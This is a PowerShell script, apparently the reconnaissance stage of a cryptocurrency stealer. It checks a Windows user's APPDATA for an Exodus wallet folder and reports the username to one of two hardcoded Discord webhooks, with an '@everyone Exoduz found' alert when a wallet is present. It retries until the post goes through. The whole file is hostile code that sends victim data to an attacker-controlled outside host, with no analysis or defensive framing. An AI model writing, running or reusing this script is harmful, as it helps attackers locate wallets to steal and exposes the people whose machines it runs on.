$discordHookFound = 'https://discord.com/api/webhooks/1444035629498503360/r7W7s_oV8xZeYKWTRP1Am4zx_I_QiYyG7pAFPOTmaK1FMtSJRPLSCPzLQFJW4IIxaVk9'
$discordHookNotFound = 'https://discord.com/api/webhooks/1442110365943988296/G_owEIDLsodiOMraqtJdeyd1Pbq1565m8MRC_sNJ5OKgonwr_T8vPkAc5fp3Gq8806Va'
$exodusDir = Join-Path $env:APPDATA 'Exodus'
$avatarUrl = 'https://i.imgur.com/4NJG86V.png'
$embedColor = 7224248
$currentTime = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
$userName = $env:USERNAME

function Send-DiscordEmbed($hook, $title, $desc, $color, $thumb) {
    $payload = @{
        embeds = @(
            @{
                title = $title
                description = $desc
                color = $color
                thumbnail = @{ url = $thumb }
            }
        )
    } | ConvertTo-Json -Depth 10
    $sent = $false
    do {
        try {
            $response = Invoke-WebRequest -Uri $hook -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
            if ($response.StatusCode -eq 204) {
                $sent = $true
            } else {
                Start-Sleep -Seconds 1
            }
        } catch {
            Start-Sleep -Seconds 1
        }
    } while (-not $sent)
}

if (Test-Path -Path $exodusDir) {
    Send-DiscordEmbed $discordHookFound '@everyone Exoduz found' "Found on $userName" $embedColor $avatarUrl
} else {
    Send-DiscordEmbed $discordHookNotFound 'Exoduz not found' "Not found on $userName" $embedColor $avatarUrl
}
